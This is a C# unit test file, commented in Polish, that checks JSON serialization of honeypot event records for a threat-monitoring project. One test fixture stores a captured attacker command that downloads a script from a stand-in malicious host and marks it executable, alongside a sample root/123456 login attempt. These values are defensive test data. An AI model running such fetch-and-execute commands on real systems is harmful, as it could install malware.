using System.Text.Json;
using HoneyGrid.Contracts;

namespace HoneyGrid.Contracts.Tests;

/// <summary>
/// Testy round-trip serializacji kontraktu HoneypotEvent —
/// weryfikują dokładne nazwy właściwości JSON oraz pomijanie pól null.
/// </summary>
public class SerializationTests
{
    /// <summary>Buduje w pełni wypełnione zdarzenie zgodne z przykładem ze specyfikacji.</summary>
    private static HoneypotEvent CreateFullEvent() => new()
    {
        Id = Guid.Parse("7d9f3a7e-4f0a-4c79-9a1b-2f3c4d5e6f70"),
        AttackerIp = "203.0.113.45",
        SensorId = "ssh-eu-01",
        SensorType = SensorType.Ssh,
        Timestamp = DateTimeOffset.Parse("2026-06-10T14:23:01Z"),
        EventType = EventType.LoginFailed,
        SessionId = "cowrie-session-guid",
        Geo = new GeoInfo
        {
            Country = "VN",
            CountryName = "Vietnam",
            City = "Hanoi",
            Lat = 21.02,
            Lon = 105.84,
            Asn = "AS7552",
            Org = "Viettel",
        },
        Credentials = new CredentialPair { Username = "root", Password = "123456" },
        Command = "wget http://malicious.example/x.sh; chmod +x x.sh",
        DownloadHash = "sha256:abc123",
        Http = new HttpInfo { Method = "GET", Path = "/wp-login.php", UserAgent = "Mozilla/5.0" },
        ThreatIntel = new ThreatIntelInfo
        {
            KnownMalicious = true,
            Sources = ["AbuseIPDB"],
            Score = 87,
        },
        Classification = new ClassificationInfo
        {
            KillChainPhase = KillChainPhase.Delivery,
            Category = "mirai_botnet",
            Sophistication = 0.3,
            Intent = "cryptominer",
            ActorId = "actor-0047",
        },
        TtyRef = "blob://tty/2026/06/10/session.bin",
        RawRef = "blob://raw/2026/06/10/ssh-eu-01/event.json",
    };

    [Fact]
    public void FullEvent_Serialization_UsesExactJsonPropertyNames()
    {
        var json = HoneyGridJson.Serialize(CreateFullEvent());
        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        // Dokładne nazwy właściwości najwyższego poziomu.
        Assert.Equal("7d9f3a7e-4f0a-4c79-9a1b-2f3c4d5e6f70", root.GetProperty("id").GetString());
        Assert.Equal("203.0.113.45", root.GetProperty("attackerIp").GetString());
        Assert.Equal("ssh-eu-01", root.GetProperty("sensorId").GetString());
        Assert.Equal("ssh", root.GetProperty("sensorType").GetString());
        Assert.Equal("login.failed", root.GetProperty("eventType").GetString());
        Assert.Equal("cowrie-session-guid", root.GetProperty("sessionId").GetString());
        Assert.Equal("wget http://malicious.example/x.sh; chmod +x x.sh", root.GetProperty("command").GetString());
        Assert.Equal("sha256:abc123", root.GetProperty("downloadHash").GetString());
        Assert.Equal("blob://tty/2026/06/10/session.bin", root.GetProperty("ttyRef").GetString());
        Assert.Equal("blob://raw/2026/06/10/ssh-eu-01/event.json", root.GetProperty("rawRef").GetString());

        // Zagnieżdżone obiekty.
        var geo = root.GetProperty("geo");
        Assert.Equal("VN", geo.GetProperty("country").GetString());
        Assert.Equal("Vietnam", geo.GetProperty("countryName").GetString());
        Assert.Equal("Hanoi", geo.GetProperty("city").GetString());
        Assert.Equal(21.02, geo.GetProperty("lat").GetDouble());
        Assert.Equal(105.84, geo.GetProperty("lon").GetDouble());
        Assert.Equal("AS7552", geo.GetProperty("asn").GetString());
        Assert.Equal("Viettel", geo.GetProperty("org").GetString());

        var credentials = root.GetProperty("credentials");
        Assert.Equal("root", credentials.GetProperty("username").GetString());
        Assert.Equal("123456", credentials.GetProperty("password").GetString());

        var http = root.GetProperty("http");
        Assert.Equal("GET", http.GetProperty("method").GetString());
        Assert.Equal("/wp-login.php", http.GetProperty("path").GetString());
        Assert.Equal("Mozilla/5.0", http.GetProperty("userAgent").GetString());

        var threatIntel = root.GetProperty("threatIntel");
        Assert.True(threatIntel.GetProperty("knownMalicious").GetBoolean());
        Assert.Equal("AbuseIPDB", threatIntel.GetProperty("sources")[0].GetString());
        Assert.Equal(87, threatIntel.GetProperty("score").GetInt32());

        var classification = root.GetProperty("classification");
        Assert.Equal("delivery", classification.GetProperty("killChainPhase").GetString());
        Assert.Equal("mirai_botnet", classification.GetProperty("category").GetString());
        Assert.Equal(0.3, classification.GetProperty("sophistication").GetDouble());
        Assert.Equal("cryptominer", classification.GetProperty("intent").GetString());
        Assert.Equal("actor-0047", classification.GetProperty("actorId").GetString());
    }

    [Fact]
    public void FullEvent_RoundTrip_PreservesAllValues()
    {
        var original = CreateFullEvent();

        var json = HoneyGridJson.Serialize(original);
        var deserialized = HoneyGridJson.Deserialize(json);

        Assert.NotNull(deserialized);
        Assert.Equal(original.Id, deserialized.Id);
        Assert.Equal(original.AttackerIp, deserialized.AttackerIp);
        Assert.Equal(original.SensorId, deserialized.SensorId);
        Assert.Equal(original.SensorType, deserialized.SensorType);
        Assert.Equal(original.Timestamp, deserialized.Timestamp);
        Assert.Equal(original.EventType, deserialized.EventType);
        Assert.Equal(original.SessionId, deserialized.SessionId);
        Assert.Equal(original.Geo, deserialized.Geo);
        Assert.Equal(original.Credentials, deserialized.Credentials);
        Assert.Equal(original.Command, deserialized.Command);
        Assert.Equal(original.DownloadHash, deserialized.DownloadHash);
        Assert.Equal(original.Http, deserialized.Http);
        Assert.Equal(original.ThreatIntel!.KnownMalicious, deserialized.ThreatIntel!.KnownMalicious);
        Assert.Equal(original.ThreatIntel.Sources, deserialized.ThreatIntel.Sources);
        Assert.Equal(original.ThreatIntel.Score, deserialized.ThreatIntel.Score);
        Assert.Equal(original.Classification, deserialized.Classification);
        Assert.Equal(original.TtyRef, deserialized.TtyRef);
        Assert.Equal(original.RawRef, deserialized.RawRef);

        // Ponowna serializacja daje identyczny JSON (pełna stabilność round-trip).
        Assert.Equal(json, HoneyGridJson.Serialize(deserialized));
    }

    [Fact]
    public void MinimalEvent_Serialization_OmitsNullFields()
    {
        // Minimalne zdarzenie "connect" z sensora TCP — bez geo, credentials, http itd.
        var evt = new HoneypotEvent
        {
            Id = Guid.NewGuid(),
            AttackerIp = "198.51.100.7",
            SensorId = "tcp-eu-02",
            Timestamp = DateTimeOffset.Parse("2026-06-10T08:00:00Z"),
            EventType = EventType.Connect,
        };

        var json = HoneyGridJson.Serialize(evt);
        using var doc = JsonDocument.Parse(json);
        var root = doc.RootElement;

        // Pola null są pomijane w JSON.
        Assert.False(root.TryGetProperty("sensorType", out _));
        Assert.False(root.TryGetProperty("sessionId", out _));
        Assert.False(root.TryGetProperty("geo", out _));
        Assert.False(root.TryGetProperty("credentials", out _));
        Assert.False(root.TryGetProperty("command", out _));
        Assert.False(root.TryGetProperty("downloadHash", out _));
        Assert.False(root.TryGetProperty("http", out _));
        Assert.False(root.TryGetProperty("threatIntel", out _));
        Assert.False(root.TryGetProperty("classification", out _));
        Assert.False(root.TryGetProperty("ttyRef", out _));
        Assert.False(root.TryGetProperty("rawRef", out _));

        // Pola wymagane są obecne.
        Assert.Equal("198.51.100.7", root.GetProperty("attackerIp").GetString());
        Assert.Equal("tcp-eu-02", root.GetProperty("sensorId").GetString());
        Assert.Equal("connect", root.GetProperty("eventType").GetString());
    }

    [Fact]
    public void Deserialize_SpecExampleJson_MapsAllFields()
    {
        // JSON dokładnie wg przykładu ze specyfikacji projektu.
        const string json = """
        {
          "id": "11111111-2222-3333-4444-555555555555",
          "attackerIp": "203.0.113.45",
          "sensorId": "ssh-eu-01",
          "sensorType": "ssh",
          "timestamp": "2026-06-10T14:23:01Z",
          "eventType": "login.failed",
          "sessionId": "cowrie-session-guid",
          "geo": { "country": "VN", "countryName": "Vietnam", "city": "Hanoi", "lat": 21.02, "lon": 105.84, "asn": "AS7552", "org": "Viettel" },
          "credentials": { "username": "root", "password": "123456" },
          "threatIntel": { "knownMalicious": true, "sources": ["AbuseIPDB"], "score": 87 },
          "classification": { "killChainPhase": "delivery", "category": "mirai_botnet", "sophistication": 0.3, "intent": "cryptominer", "actorId": "actor-0047" }
        }
        """;

        var evt = HoneyGridJson.Deserialize(json);

        Assert.NotNull(evt);
        Assert.Equal(Guid.Parse("11111111-2222-3333-4444-555555555555"), evt.Id);
        Assert.Equal("203.0.113.45", evt.AttackerIp);
        Assert.Equal(SensorType.Ssh, evt.SensorType);
        Assert.Equal(EventType.LoginFailed, evt.EventType);
        Assert.Equal("Hanoi", evt.Geo?.City);
        Assert.Equal("root", evt.Credentials?.Username);
        Assert.True(evt.ThreatIntel?.KnownMalicious);
        Assert.Equal(KillChainPhase.Delivery, evt.Classification?.KillChainPhase);
        Assert.Null(evt.Http);
        Assert.Null(evt.Command);
    }
}
